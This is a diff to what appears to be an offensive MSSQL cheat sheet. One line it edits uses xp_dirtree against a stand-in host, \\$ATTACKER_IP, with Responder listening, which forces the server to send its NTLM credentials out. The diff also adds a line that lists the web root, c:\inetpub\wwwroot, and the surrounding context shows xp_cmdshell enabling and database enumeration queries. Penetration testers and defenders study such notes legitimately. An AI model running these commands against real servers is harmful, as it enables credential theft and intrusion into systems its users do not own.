@@ -47,7 +47,14 @@ enable_xp_cmdshell
 
 in MSSQL server try, start responder on attacker box:
 ```sql
-xp_dirtree \\$ATTACKER_IP\fake\share
+xp_dirtree "\\$ATTACKER_IP\fake\share";
+```
+
+List files:
+---
+
+```sql
+xp_dirtree "c:\inetpub\wwwroot";
 ```
 
 **List databases:**
@@ -81,6 +88,7 @@ List columns:
 ```sql
 SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '$COLUMN') order by name offset 1 rows fetch next 1 rows only
 ```
+
 and offset for each entry
 List column:
 ---
